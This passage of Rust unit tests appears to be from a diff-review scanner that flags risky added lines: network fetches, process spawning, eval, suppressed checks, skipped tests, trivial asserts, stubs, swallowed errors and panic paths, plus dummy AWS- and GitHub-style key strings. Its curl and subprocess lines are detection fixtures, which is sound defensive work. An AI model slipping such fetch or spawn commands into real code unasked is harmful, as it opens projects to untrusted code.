            format!("AKIA{}", "Q".repeat(15)),
            format!("XAKIA{}", "Q".repeat(16)),
            format!("ghp_{}", "a".repeat(35)),
            "-----BEGIN CERTIFICATE-----".to_owned(),
        ] {
            assert_eq!(signals(&added("notes.txt", &[&line])), [], "{line}");
        }
        let found = file_evidence(&added("notes.txt", &[&aws]));
        assert!(
            !format!("{found:?}").contains("AKIA"),
            "a secret was copied into evidence"
        );
    }

    #[test]
    fn a_path_scoped_rule_follows_the_generated_rule_and_a_token_rule_does_not() {
        assert_eq!(
            signals(&added("target/debug/build.rs", &["fn main() {}"])),
            []
        );
        assert_eq!(
            signals(&added(
                "node_modules/x/package.json",
                &["\"postinstall\": \"x\""]
            )),
            []
        );
        assert_eq!(
            signals(&added(
                "src/generated/x.rs",
                &["std::process::Command::new(\"curl\");"]
            )),
            [S::ProcessSpawn]
        );
    }

    #[test]
    fn suppressions_are_read_in_comments() {
        assert_eq!(
            signals(&added("x.py", &["import os  # noqa: F401"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.ts", &["// @ts-ignore"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.go", &["x := y //nolint:errcheck"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("src/x.rs", &["#[allow(dead_code)]"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added(
                "src/x.rs",
                &["#[expect(dead_code, reason = \"r\")]"]
            )),
            []
        );
    }

    #[test]
    fn a_shebang_names_the_language_of_a_file_with_no_extension() {
        let patch = "--- /dev/null\n+++ b/bin/fetch\n@@ -0,0 +1,2 @@\n+#!/usr/bin/env bash\n+curl -fsSL https://x\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), [S::NetworkFetch]);
        let patch = "--- /dev/null\n+++ b/bin/notes\n@@ -0,0 +1,1 @@\n+curl is a tool\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn duplicates_are_reported_once_and_order_is_stable() {
        let file = added("src/x.rs", &["unsafe { unsafe { f() } }", "unsafe {}"]);
        let lines: Vec<u32> = file_evidence(&file).iter().map(|e| e.line).collect();
        assert_eq!(lines, [2, 3]);
        assert_eq!(file_evidence(&file), file_evidence(&file.clone()));
    }

    /// Batteries, phase 1: the ways a change makes a test stop testing, and unfinished work
    /// presented as done. Each is read as code on an added line.
    #[test]
    fn a_skipped_test_a_trivial_assert_and_a_stub_are_evidence() {
        let cases: &[(&str, &str, EvidenceSignal)] = &[
            ("tests/a.rs", "#[ignore]", S::TestSkipped),
            ("tests/a.rs", "#[ignore = \"slow\"]", S::TestSkipped),
            (
                "test_a.py",
                "@pytest.mark.skip(reason=\"later\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "@pytest.mark.skipif(sys.platform == \"win32\")",
                S::TestSkipped,
            ),
            ("test_a.py", "@pytest.mark.xfail", S::TestSkipped),
            ("test_a.py", "    pytest.skip(\"later\")", S::TestSkipped),
            (
                "test_a.py",
                "@unittest.skipUnless(HAVE, \"x\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "        self.skipTest(\"later\")",
                S::TestSkipped,
            ),
            ("a.test.ts", "it.skip(\"adds\", () => {});", S::TestSkipped),
            (
                "a.test.ts",
                "describe.skip(\"suite\", () => {});",
                S::TestSkipped,
            ),
            ("a.test.ts", "test.todo(\"adds\");", S::TestSkipped),
            ("a.test.ts", "xit(\"adds\", () => {});", S::TestSkipped),
            ("a_test.go", "\tt.Skip(\"later\")", S::TestSkipped),
            ("a_test.go", "\tt.SkipNow()", S::TestSkipped),
            ("tests/a.rs", "    assert!(true);", S::TrivialAssert),
            (
                "tests/a.rs",
                "    assert_eq!(true, true);",
                S::TrivialAssert,
            ),
            ("test_a.py", "    assert True", S::TrivialAssert),
            (
                "test_a.py",
                "        self.assertTrue(True)",
                S::TrivialAssert,
            ),
            ("a.test.ts", "  expect(true).toBe(true);", S::TrivialAssert),
            ("a.test.ts", "  assert.ok(true);", S::TrivialAssert),
            ("src/a.rs", "    todo!()", S::StubAdded),
            ("src/a.rs", "    unimplemented!(\"later\")", S::StubAdded),
            ("a.py", "    raise NotImplementedError", S::StubAdded),
            (
                "a.py",
                "    raise NotImplementedError(\"later\")",
                S::StubAdded,
            ),
        ];
        for (path, line, signal) in cases {
            assert_eq!(signals(&added(path, &[line])), [*signal], "{path}: {line}");
        }
    }

    /// The same words where they are not that code: no evidence.
    #[test]
    fn near_misses_of_the_integrity_tokens_are_not_evidence() {
        let cases: &[(&str, &str)] = &[
            (
                "tests/a.rs",
                "// #[ignore] was here; assert!(true) and todo!() too",
            ),
            ("tests/a.rs", "let s = \"#[ignore] assert!(true) todo!()\";"),
            ("tests/a.rs", "#[ignored_by_default]"),
            ("tests/a.rs", "    assert!(true_enough(x));"),
            ("tests/a.rs", "    debug_assert!(truer);"),
            ("src/a.rs", "    my_todo!(x)"),
            (
                "test_a.py",
                "# pytest.mark.skip, assert True, raise NotImplementedError",
            ),
            ("test_a.py", "x = \"pytest.skip(\""),
            ("test_a.py", "    assert True_value"),
            ("test_a.py", "    assert Trueish is None"),
            ("a.py", "    raise NotImplementedErrorSubclass()"),
            ("a.py", "    x.raise_NotImplementedError()"),
            ("a.test.ts", "exit(code);"),
            ("a.test.ts", "submit.skip(1);"),
            ("a.test.ts", "console.assert(true);"),
            ("a.test.ts", "// it.skip(\"x\")"),
            ("a_test.go", "\tctx.t.Skip(\"x\")"),
            ("a_test.go", "\tit.Skip(\"x\")"),
            // the tokens of another language are not this file's
            ("a.go", "\ttodo!()"),
            ("a.ts", "#[ignore]"),
        ];
        for (path, line) in cases {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// A file from hunk body lines written as in a patch (`+`, `-` or a space first), after one
    /// context line `x`.
    fn hunk_of(path: &str, body: &[&str]) -> ReviewFile {
        let old = 1 + body.iter().filter(|l| !l.starts_with('+')).count();
        let new = 1 + body.iter().filter(|l| !l.starts_with('-')).count();
        let mut text = format!("--- a/{path}\n+++ b/{path}\n@@ -1,{old} +1,{new} @@\n x\n");
        for line in body {
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    /// A hunk that is the beginning of a new file: `body` lines without their `+`.
    fn new_file(path: &str, body: &[&str]) -> ReviewFile {
        let mut text = format!(
            "diff --git a/{path} b/{path}\nnew file mode 100644\n--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{} @@\n",
            body.len()
        );
        for line in body {
            text.push('+');
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    /// One item as the tests name it: its signal, its basis and its line.
    type Item = (EvidenceSignal, Basis, u32);

    fn found(file: &ReviewFile) -> Vec<Item> {
        file_evidence(file)
            .iter()
            .map(|e| (e.signal, e.basis, e.line))
            .collect()
    }

    /// Batteries, slice 2: a handler and its empty body are read together, on the line that
    /// opens the handler, and say that they were (`hunk`).
    #[test]
    fn an_error_handler_with_nothing_in_it_is_evidence_read_across_two_lines() {
        let swallowed = [(S::ErrorSwallowed, Basis::Hunk, 2)];
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    pass"]),
            (
                "a.py",
                &["+    except (KeyError, OSError) as e:", "+        ..."],
            ),
            ("a.py", &["+except Exception: pass"]),
            (
                "a.py",
                &["+except:  # nothing to do", "+    pass  # really"],
            ),
            ("a.ts", &["+} catch (e) {}"]),
            ("a.ts", &["+} catch { }"]),
            ("a.ts", &["+} catch (err) {", "+}"]),
            ("a.ts", &["+try { f(); } catch ({ message }) {", "+}"]),
            ("a.go", &["+\tif err != nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil {}"]),
            ("a.go", &["+\tif err := f(); err != nil {", "+\t}"]),
            // the body is the next line of the new file: a removed line between is not it,
            // and an unchanged line is
            (
                "a.py",
                &["+except ValueError:", "-    handle()", "+    pass"],
            ),
            ("a.py", &["+except ValueError:", "     pass"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), swallowed, "{path}: {body:?}");
        }
    }

    /// An arm or an assignment that drops the error on one line is found by its token.
    #[test]
    fn an_error_dropped_on_one_line_is_lexical_evidence() {
        for (path, line) in [
            ("src/a.rs", "        Err(_) => {}"),
            ("src/a.rs", "        Err(_) => (),"),
            ("a.go", "\t_ = err"),
        ] {
            assert_eq!(
                found(&added(path, &[line])),
                [(S::ErrorSwallowed, Basis::Lexical, 2)],
                "{path}: {line}"
            );
        }
    }

    /// A handler that does something, one whose body the hunk does not show, and the same
    /// words elsewhere: no evidence.
    #[test]
    fn a_handler_that_handles_or_whose_body_is_unseen_is_not_evidence() {
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    log(e)"]),
            ("a.py", &["+except ValueError:"]),
            ("a.py", &["+except ValueError:", "-    pass"]),
            ("a.py", &["+except ValueError: return None"]),
            ("a.py", &["+exceptional = 1", "+pass"]),
            ("a.py", &["+# except ValueError: pass"]),
            ("a.py", &["+s = \"except ValueError: pass\""]),
            ("a.py", &["+else:", "+    pass"]),
            ("a.ts", &["+} catch (e) { log(e); }"]),
            ("a.ts", &["+} catch (e) {", "+  log(e);"]),
            ("a.ts", &["+} catch (e) {"]),
            // a promise handler that does something (an empty one is evidence since review V3
            // round 1; before, no `.catch(…)` was read at all)
            ("a.ts", &["+p.catch((e) => { log(e); });"]),
            ("a.ts", &["+const catcher = {};"]),
            ("a.ts", &["+// } catch (e) {}"]),
            ("a.go", &["+\tif err != nil {", "+\t\treturn err"]),
            ("a.go", &["+\tif err == nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil && retry {", "+\t}"]),
            ("a.go", &["+\tfor err != nil {", "+\t}"]),
            ("a.go", &["+\t_ = errors.New(\"x\")"]),
            ("src/a.rs", &["+        Err(e) => {}"]),
            ("src/a.rs", &["+        Err(_) => { log(); }"]),
            // another language's form
            ("a.go", &["+except ValueError:", "+    pass"]),
            ("a.py", &["+} catch (e) {}"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), [], "{path}: {body:?}");
        }
    }

    /// A removed empty handler is the repair, and reading neighbours changes nothing a token
    /// rule finds: the same line, the same signals, the first rung.
    #[test]
    fn the_neighbour_reading_rule_leaves_token_evidence_as_it_was() {
        assert_eq!(
            found(&hunk_of("a.py", &["-except ValueError:", "-    pass"])),
            []
        );
        let file = hunk_of(
            "a.py",
            &["+import subprocess", "+subprocess.run(x)", "+eval(y)"],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 3),
                (S::DynamicEval, Basis::Lexical, 4),
            ]
        );
        assert_eq!(
            (Basis::Lexical.label(), Basis::Hunk.label()),
            ("lexical", "hunk")
        );
        assert!(Basis::Hunk > Basis::Lexical);
    }

    /// The integrity signals of a Rust hunk are read from its tokens, whatever the spelling
    /// and the lines. (Until 2026-11-14 a parser confirmed each of these, and the item said
    /// `syntax_fragment`; that value is gone with the parser.)
    #[test]
    fn the_tokens_of_a_hunk_give_rust_constructs_whatever_their_spelling() {
        let cases: &[(&str, &[&str], EvidenceSignal)] = &[
            (
                "src/a.rs",
                &["+    let v = f().unwrap();"],
                S::PanicPathAdded,
            ),
            (
                "src/a.rs",
                &["+    let v = f()", "+        .expect(\"set\");"],
                S::PanicPathAdded,
            ),
            ("tests/a.rs", &["+    assert!( true );"], S::TrivialAssert),
            (
                "tests/a.rs",
                &["+    assert!(true, \"always\");"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+    assert_eq!(true , true);"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+#[cfg_attr(miri, ignore)]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            (
                "tests/a.rs",
                &["+#[ignore]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            ("src/a.rs", &["+    todo!( )"], S::StubAdded),
            // the hunk closes a block it did not open, and opens one it does not close
            (
                "src/a.rs",
                &[
                    "     y",
                    " }",
                    "+fn b() {",
                    "+    if c {",
                    "+        h().unwrap();",
                ],
                S::PanicPathAdded,
            ),
        ];
        for (path, body, signal) in cases {
            let items = found(&hunk_of(path, body));
            assert_eq!(items.len(), 1, "{path}: {body:?}: {items:?}");
            assert_eq!(
                (items[0].0, items[0].1),
                (*signal, Basis::Lexical),
                "{path}: {body:?}"
            );
        }
        // the same constructs with their tokens on several lines say `hunk`
        let over_lines: &[(&[&str], EvidenceSignal, u32)] = &[
            (
                &["+    let v = f()", "+        .", "+        unwrap();"],
                S::PanicPathAdded,
                3,
            ),
            (
                &["+    assert!(", "+        true", "+    );"],
                S::TrivialAssert,
                2,
            ),
            (
                &["+#[cfg_attr(", "+    miri,", "+    ignore", "+)]"],
                S::TestSkipped,
                2,
            ),
            (&["+#[", "+    ignore]"], S::TestSkipped, 2),
            (&["+    todo", "+    !()"], S::StubAdded, 2),
        ];
        for (body, signal, line) in over_lines {
            assert_eq!(
                found(&hunk_of("tests/a.rs", body)),
                [(*signal, Basis::Hunk, *line)],
                "{body:?}"
            );
        }
    }

    /// The decision of 2026-11-14 (D1): nothing removes evidence. A panic path under an exact
    /// `#[cfg(test)]`, first attribute of a top-level item of a file the patch creates whole,
    /// used to be withdrawn as proved test code. The second independent review compiled four
    /// files that met every condition and panicked in production code (IR2-H-1 to IR2-H-4).
    /// Now each such item stands, at the same score as anywhere, and says `test_likely`.
    /// Before, each of these three files gave no evidence.
    #[test]
    fn a_panic_path_under_cfg_test_in_a_new_file_stands_and_is_marked_test_likely() {
        let marks = |body: &[&str]| -> Vec<(EvidenceSignal, Basis, u32, bool)> {
            file_evidence(&new_file("src/a.rs", body))
                .iter()
                .map(|e| (e.signal, e.basis, e.line, e.test_likely))
                .collect()
        };
        assert_eq!(
            marks(&[
                "pub fn real() {}",
                "",
                "#[cfg(test)]",
                "mod checks {",
                "    use super::*;",
                "    #[test]",
                "    fn a() {",
                "        assert_eq!(parse(\"x\").unwrap(), 1);",
                "        f().expect(\"set\");",
                "    }",
                "}",
            ]),
            [
                (S::PanicPathAdded, Basis::Lexical, 8, true),
                (S::PanicPathAdded, Basis::Lexical, 9, true),
            ]
        );
        assert_eq!(
            marks(&["#[cfg(test)]", "fn helper() {", "    f().unwrap();", "}"]),
            [(S::PanicPathAdded, Basis::Lexical, 3, true)]
        );
        assert_eq!(
            marks(&[
                "/// For tests.",
                "#[cfg(test)]",
                "#[inline]",
                "impl Thing {",
                "    fn make() -> Self { f().expect(\"x\") }",
                "}",
            ]),
            [(S::PanicPathAdded, Basis::Lexical, 5, true)]
        );
        // the mark changes no score: the same file without the attribute scores the same
        let score = |body: &[&str]| crate::risk::score_file(&new_file("src/a.rs", body)).0;
        assert_eq!(
            score(&["#[cfg(test)]", "fn helper() {", "    f().unwrap();", "}"]),
            score(&["#[inline]", "fn helper() {", "    f().unwrap();", "}"])
        );
    }

    /// Review V3 round 4, VD3R4-H-1. A hunk of an existing file that says it starts at line 1
    /// is not the beginning of the file: the header is the patch writer's word, and `git apply
    /// --unidiff-zero` or `-C0` applies the hunk further down, under a comment opened above
    /// it. Before, this production panic path was withdrawn. Since 2026-11-14 nothing is
    /// withdrawn anywhere, and these stay as cases that must keep their item.
    #[test]
    fn a_hunk_that_only_says_it_starts_the_file_keeps_its_panic_path() {
        let forged = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,4 +1,4 @@\n #[cfg(test)] // */\n fn production() {\n-    safe();\n+    load().unwrap();\n }\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&forged), [(S::PanicPathAdded, Basis::Lexical, 3)]);
        // every line added and line 1 claimed, but the file is not new
        let inserted = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)]\n+fn helper() {\n+    load().unwrap();\n+}\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&inserted), [(S::PanicPathAdded, Basis::Lexical, 3)]);
        // a new file in two hunks: neither is the whole file
        let two = parse(
            "diff --git a/src/a.rs b/src/a.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/a.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)]\n+fn helper() {\n+    load().unwrap();\n+}\n@@ -0,0 +5,1 @@\n+fn more() {}\n",
        );
        if let Ok(mut files) = two {
            let file = files.remove(0);
            assert!(
                found(&file).iter().any(|item| item.0 == S::PanicPathAdded),
                "a new file in two hunks was believed"
            );
        }
    }

    /// The owner's decision of 2026-11-14, on the reviewer's suggestion: a panic path that the
    /// hunk shows under a test attribute is not withdrawn (no test attribute is proof) and is
    /// not scored differently (a hint must not weaken a judge); it is marked, so that a reader
    /// can tell it from the same call in code that shows no sign of being a test.
    #[test]
    fn a_panic_path_under_a_test_attribute_stands_and_is_marked_test_likely() {
        let marks = |file: &ReviewFile| -> Vec<(EvidenceSignal, u32, bool)> {
            file_evidence(file)
                .iter()
                .map(|e| (e.signal, e.line, e.test_likely))
                .collect()
        };
        // in a change to an existing file, with one call inside another macro's arguments
        let test = hunk_of(
            "src/a.rs",
            &[
                "+#[test]",
                "+fn a() {",
                "+    f().unwrap();",
                "+    assert_eq!(g().unwrap(), 1);",
                "+}",
            ],
        );
        assert_eq!(
            marks(&test),
            [(S::PanicPathAdded, 4, true), (S::PanicPathAdded, 5, true)]
        );
        for attribute in ["+#[tokio::test]", "+#[rstest]", "+#[cfg(test)]"] {
            let file = hunk_of(
                "src/a.rs",
                &[attribute, "+fn a() {", "+    f().unwrap();", "+}"],
            );
            assert_eq!(marks(&file), [(S::PanicPathAdded, 4, true)], "{attribute}");
        }
        // code that shows no sign of being a test, and the function after a test
        let plain = hunk_of(
            "src/a.rs",
            &[
                "+#[test]",
                "+fn a() {}",
                "+fn real() {",
                "+    f().unwrap();",
                "+}",
            ],
        );
        assert_eq!(marks(&plain), [(S::PanicPathAdded, 5, false)]);
        // Review V3 round 7, VD3R7-L-1: a production function on the same line as a test, and
        // one line that holds a call of each
        for (line, marked) in [
            (
                "+#[test] fn check() {} fn production() { b().unwrap(); }",
                false,
            ),
            (
                "+#[test] fn check() { a().unwrap(); } fn production() { b().unwrap(); }",
                false,
            ),
            ("+#[test] fn check() { a().unwrap(); }", true),
        ] {
            assert_eq!(
                marks(&hunk_of("src/a.rs", &[line])),
                [(S::PanicPathAdded, 2, marked)],
                "{line}"
            );
        }
        // A test inside another macro's body. The parser did not read there and the item had
        // no hint; the tokens of a macro's body are tokens like any other, and it has one.
        let in_macro = hunk_of(
            "src/a.rs",
            &[
                "+outer! {",
                "+    #[test]",
                "+    fn check() {",
                "+        f().unwrap();",
                "+    }",
                "+}",
            ],
        );
        assert_eq!(marks(&in_macro), [(S::PanicPathAdded, 5, true)]);
        // only a panic path carries the mark
        let other = hunk_of(
            "tests/a.rs",
            &["+#[test]", "+fn a() {", "+    todo!();", "+}"],
        );
        assert_eq!(marks(&other), [(S::StubAdded, 4, false)]);
        // A hunk with a line of 70 KB. The parser did not read such a hunk, so nothing was
        // known and nothing was marked; no size switches the token reader off.
        let long = format!("+    f().unwrap(); // {}", "a".repeat(70_000));
        let large = hunk_of("src/a.rs", &["+#[test]", "+fn a() {", long.as_str(), "+}"]);
        assert_eq!(marks(&large), [(S::PanicPathAdded, 4, true)]);
        // a hint weakens nothing: the score is the score of the same call anywhere
        let unmarked = hunk_of(
            "src/a.rs",
            &["+fn a() {", "+    f().unwrap();", "+}", "+// x", "+// y"],
        );
        assert_eq!(
            crate::risk::score_file(&test).0,
            crate::risk::score_file(&unmarked).0
        );
    }

    /// Review V3 round 5, VD3R5-H-1. One section creates a file whose `#[cfg(test)]` a line
    /// comment follows; a later section for the same path prepends `/*`. Git applies both, and
    /// the function is in the program. Before, the panic path was withdrawn; then a plan
    /// counted the sections that name a path. Since 2026-11-14 a created file is read like any
    /// hunk, and since the parser left there is no plan: alone or beside another section, in
    /// either order, the item stands.
    #[test]
    fn a_created_file_is_read_like_any_other_hunk() {
        let created = "diff --git a/src/d.rs b/src/d.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/d.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)] // */\n+fn production() {\n+    load().unwrap();\n+}\n";
        let prepended = "diff --git a/src/d.rs b/src/d.rs\n--- a/src/d.rs\n+++ b/src/d.rs\n@@ -1,1 +1,2 @@\n+/*\n #[cfg(test)] // */\n";
        let stands = [(S::PanicPathAdded, Basis::Lexical, 3)];
        let alone = parse(created).unwrap();
        assert_eq!(found(&alone[0]), stands);
        assert!(file_evidence(&alone[0])[0].test_likely);
        let mut both = parse(created).unwrap();
        both.extend(parse(prepended).unwrap());
        let mut reversed = parse(prepended).unwrap();
        reversed.extend(parse(created).unwrap());
        for files in [both, reversed] {
            let at = files
                .iter()
                .position(|file| {
                    file.path == "src/d.rs" && file.patch_twin.hunks[0].lines.len() == 4
                })
                .unwrap();
            assert_eq!(found(&files[at]), stands);
            let ranked = crate::rank(&files);
            let created = ranked
                .iter()
                .find(|file| file.evidence.len() == 1)
                .expect("the created file is ranked with its item");
            assert_eq!(created.evidence[0].signal, S::PanicPathAdded);
        }
    }

    /// Independent review, IR-H-1. The withdrawal went by line: a production function that
    /// shares a line with a proved test function lost its panic path whenever the parser named
    /// no construct for it (the function form, or a call inside a macro's arguments). Compiled
    /// and run, both functions panicked. Nothing is withdrawn now; what goes by the line is
    /// the hint, and a line has it only when every panic path on it stands inside an item
    /// that spells a test.
    #[test]
    fn a_production_call_on_the_line_of_a_test_stands_and_has_no_hint() {
        let marks = |body: &[&str]| -> Vec<(EvidenceSignal, u32, bool)> {
            file_evidence(&new_file("src/a6.rs", body))
                .iter()
                .map(|e| (e.signal, e.line, e.test_likely))
                .collect()
        };
        assert_eq!(
            marks(&[
                "#[cfg(test)]",
                "fn t() { a().unwrap(); } pub fn production() -> u32 { Result::unwrap(crate::b()) }",
                "pub fn production2() -> u32 { vec![crate::b().unwrap()][0] } #[cfg(test)] fn t2() { a().unwrap(); }",
            ]),
            [(S::PanicPathAdded, 2, false), (S::PanicPathAdded, 3, false)]
        );
        // the controls: the test function alone on its line has the hint, with the attribute
        // on the line above or on the same line, and a comment after it is not code. Each of
        // these was withdrawn before 2026-11-14.
        for (body, line) in [
            (&["#[cfg(test)]", "fn t() { a().unwrap(); }"][..], 2),
            (
                &["#[cfg(test)] fn t() { a().unwrap(); } // only in tests"][..],
                1,
            ),
            (
                &[
                    "#[cfg(test)]",
                    "mod t {",
                    "    fn f() { vec![b().unwrap()][0] }",
                    "}",
                ][..],
                3,
            ),
        ] {
            assert_eq!(marks(body), [(S::PanicPathAdded, line, true)], "{body:?}");
        }
        // and the hint goes the same way: a production call in a macro's arguments beside a test
        let hinted: Vec<bool> = file_evidence(&hunk_of(
            "src/a.rs",
            &["+#[test] fn check() { a().unwrap(); } pub fn p() -> u32 { vec![b().unwrap()][0] }"],
        ))
        .iter()
        .map(|item| item.test_likely)
        .collect();
        assert_eq!(hinted, [false]);
    }

    /// Independent review, IR-H-2 and IR-L-1, and the second independent review, IR2-H-1 to
    /// IR2-H-4. Each of these is a new file in which the grammar sees a top-level item under
    /// an exact `#[cfg(test)]`, with no error in the tree, and the compiler sees production
    /// code: a first line the grammar reads as a shebang, a statement at the top level, a
    /// `//*` inside a block comment (the grammar does not count the nested opener), a
    /// character whose low byte is `*` or `/` (the grammar's scanner cuts it to eight bits), a
    /// comment the lexer's code view ends too early, and a `cr"\"` that is a raw string only
    /// from edition 2021. Each was compiled and run to a panic, and each gave no evidence. The
    /// parser removes nothing now, so each reports its panic path.
    #[test]
    fn a_file_the_compiler_reads_otherwise_keeps_its_panic_path() {
        for (body, line) in [
            (
                &[
                    "#! /**/ [allow(unused)] /*",
                    "#[cfg(test)] // */",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                4,
            ),
            (
                &[
                    "---x",
                    ";#[cfg(test)] /*",
                    "---",
                    "// */",
                    "mod t {",
                    "    pub fn production() -> u32 { super::b().unwrap() }",
                    "}",
                ][..],
                6,
            ),
            // IR2-H-1
            (
                &[
                    "/* //* */ #[cfg(test)] // */",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                3,
            ),
            // IR2-H-2, both ways
            (
                &[
                    "macro_rules! live { (#[cfg(test)] $($rest:tt)*) => { $($rest)* }; }",
                    "/* įĪ */ live! { // */",
                    "#[cfg(test)]",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                    "/* įĪ */ } // */",
                ][..],
                5,
            ),
            (
                &[
                    "/* /* Īį */ #[cfg(test)] // */",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                3,
            ),
            // IR2-H-3, with a method call and with the function form
            (
                &[
                    "#[cfg(test)]",
                    "fn t() { a().unwrap(); /* /* */ \" */ } pub fn production() -> u32 { crate::b().unwrap() }",
                    "/* /* */ } */",
                ][..],
                2,
            ),
            (
                &[
                    "#[cfg(test)]",
                    "fn t() { a().unwrap(); /* /* */ // */ } pub fn production() -> u32 { Result::unwrap(crate::b()) }",
                    "/* /* */ } */",
                ][..],
                2,
            ),
            // IR2-H-4
            (
                &[
                    "macro_rules! live { ($a:ident $b:literal $($rest:tt)*) => { $($rest)* }; }",
                    "live! { cr\"\\\" }",
                    "#[cfg(test)] pub mod t { // \"",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                4,
            ),
        ] {
            let items = found(&new_file("src/s.rs", body));
            assert!(
                items
                    .iter()
                    .any(|item| (item.0, item.2) == (S::PanicPathAdded, line)),
                "{body:?}: {items:?}"
            );
        }
    }

    /// Second independent review, IR2-L-1 and IR2-M-2, closed 2026-11-14 (review round 12).
    /// The compiler nests block comments, and the code view now does: it reads Rust as the
    /// compiler's lexer reads it. After `/* /* */ " */` and after `/* /* */ // */` the rest of
    /// the line is code, so the production function there is seen: the line holds a panic
    /// path outside the test function too and loses its hint, as it did while a parser read
    /// the hunk. Until then the view ended the comment at the first `*/` and took the rest of
    /// the line for a string or a comment: the hint was wrong on these two lines, and a call
    /// that stood alone after such a comment left nothing (it was declared).
    #[test]
    fn after_a_nested_comment_the_hint_is_the_code_views() {
        let hints = |body: &[&str]| -> Vec<(u32, bool)> {
            file_evidence(&new_file("src/n1.rs", body))
                .iter()
                .filter(|e| e.signal == S::PanicPathAdded)
                .map(|e| (e.line, e.test_likely))
                .collect()
        };
        // (as while the parser read; `true`, both, while the view did not nest the comment)
        assert_eq!(
            hints(&[
                "#[cfg(test)]",
                "fn t() { a().unwrap(); /* /* */ \" */ } pub fn production() -> u32 { crate::b().unwrap() }",
            ]),
            [(2, false)]
        );
        assert_eq!(
            hints(&[
                "#[cfg(test)]",
                "fn t() { a().unwrap(); /* /* */ // */ } pub fn production() -> u32 { Result::unwrap(crate::b()) }",
            ]),
            [(2, false)]
        );
        // the control: the test function alone, with the same comment, has the hint
        assert_eq!(
            hints(&["#[cfg(test)]", "fn t() { a().unwrap(); /* /* */ \" */ }",]),
            [(2, true)]
        );
        // With no other call on the line, what stands after such a comment is found (the
        // parser named these three; they left nothing while the view did not nest: second
        // independent review, IR2-M-2).
        for (line, signal) in [
            (
                "+    /* /* */ // */ let v = Result::unwrap(x);",
                S::PanicPathAdded,
            ),
            ("+    /* /* */ // */ let v = x.unwrap();", S::PanicPathAdded),
            ("+    /* /* */ // */ todo!();", S::StubAdded),
        ] {
            assert_eq!(
                found(&hunk_of("src/p.rs", &[line])),
                [(signal, Basis::Lexical, 2)],
                "{line}"
            );
        }
    }

    /// Independent review, IR-M-2, and the third, IR3-M-2. Inside another macro's body the
    /// parser named no construct, so a construct split over lines there left nothing, then a
    /// mark (`syntax_unchecked`), and in a `macro_rules!` arm nothing again. A macro's body is
    /// tokens like any other: each of these is the item it is.
    #[test]
    fn a_construct_inside_another_macros_body_is_read_like_any_other() {
        let inside = |lines: &[&str]| {
            let mut body = vec![" // ctx", "+outer! {"];
            body.extend_from_slice(lines);
            body.extend_from_slice(&["+}", " // ctx"]);
            found(&hunk_of("src/x.rs", &body))
                .iter()
                .map(|item| item.0)
                .collect::<Vec<_>>()
        };
        // (before: `syntax_unchecked` for each of these, and before that nothing)
        let split: &[(&[&str], &[EvidenceSignal])] = &[
            (&["+    assert!", "+    (true);"], &[S::TrivialAssert]),
            (&["+    assert", "+    !(true);"], &[S::TrivialAssert]),
            (&["+    todo", "+    !();"], &[S::StubAdded]),
            (&["+    let v = x.unwrap", "+    ();"], &[S::PanicPathAdded]),
            (&["+    let v = x.", "+    unwrap();"], &[S::PanicPathAdded]),
            (&["+    #", "+    [ignore]"], &[S::TestSkipped]),
            (&["+    #[", "+    ignore]"], &[S::TestSkipped]),
            (&["+    assert!{true};"], &[S::TrivialAssert]),
            (&["+    assert![true];"], &[S::TrivialAssert]),
            (&["+    todo![];"], &[S::StubAdded]),
            (&["+    unimplemented!{};"], &[S::StubAdded]),
            // a name alone is no assertion
            (&["+    it.map(assert);"], &[]),
        ];
        for (lines, expected) in split {
            assert_eq!(inside(lines), *expected, "{lines:?}");
        }
        let one_line: &[(&[&str], &[EvidenceSignal])] = &[
            (&["+    assert!(a == b);"], &[]),
            (&["+    assert_eq!(a.len(), 3, \"expected three\");"], &[]),
            (&["+    let ignored = unwrap_or(expected, todos);"], &[]),
            (&["+    assert!(true);"], &[S::TrivialAssert]),
            (&["+    x.unwrap();"], &[S::PanicPathAdded]),
            (&["+    todo!();"], &[S::StubAdded]),
            (&["+    #[ignore]", "+    fn a() {}"], &[S::TestSkipped]),
